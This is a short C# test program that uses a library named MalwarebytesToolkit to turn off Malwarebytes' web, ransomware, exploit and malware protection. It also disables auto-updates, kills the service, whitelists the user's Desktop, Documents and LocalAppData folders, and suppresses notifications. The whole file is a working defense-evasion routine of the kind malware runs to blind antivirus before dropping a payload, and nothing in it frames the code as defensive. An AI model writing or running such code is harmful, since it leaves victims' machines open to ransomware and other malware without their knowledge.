using MalwarebytesToolkit.Manager;
using MalwarebytesToolkit.Enums;
using System;

namespace Tester
{
    internal class Program
    {
        static void Main(string[] args)
        {
            MalwarebytesManager manager = new MalwarebytesManager();
            manager.DisableWebProtection();
            manager.DisableRansomwareProtection();
            manager.DisableExploitProtection();
            manager.DisableMalwarePUPProtection();
            manager.DisableAutoUpdates();

            manager.KillService();

            string[] paths = new string[]
            {

                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };

            manager.AddExclusion(ExclusionType.Folder, paths);
            manager.RemoveNotifications();
        }
    }
}
